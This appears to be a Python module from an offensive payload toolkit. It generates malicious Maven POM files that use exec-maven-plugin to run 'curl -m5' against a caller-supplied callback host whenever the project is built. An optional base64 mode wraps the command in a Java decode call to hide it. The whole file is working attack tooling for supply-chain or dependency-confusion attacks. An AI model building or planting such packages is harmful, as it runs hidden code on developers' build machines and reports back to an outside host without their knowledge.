"""Maven payload generator."""
from __future__ import annotations

import base64
from typing import Optional

from payloads.builder import PayloadBuilder

builder = PayloadBuilder()


def _encode(cmd: str, method: Optional[str]) -> str:
    if method == "b64":
        b = base64.b64encode(cmd.encode()).decode()
        return f"new String(java.util.Base64.getDecoder().decode('{b}'))"
    return f'"{cmd}"'


def generate(group: str, artifact: str, callback: str, encode: Optional[str] = None) -> str:
    """Return a POM executing a callback via exec-maven-plugin."""

    exec_cmd = _encode(f"curl -m5 {callback}", encode)
    return builder.render(
        "maven_pom.xml.j2",
        group_id=group,
        artifact_id=artifact,
        version="0.0.1",
        payload_code=exec_cmd,
    )
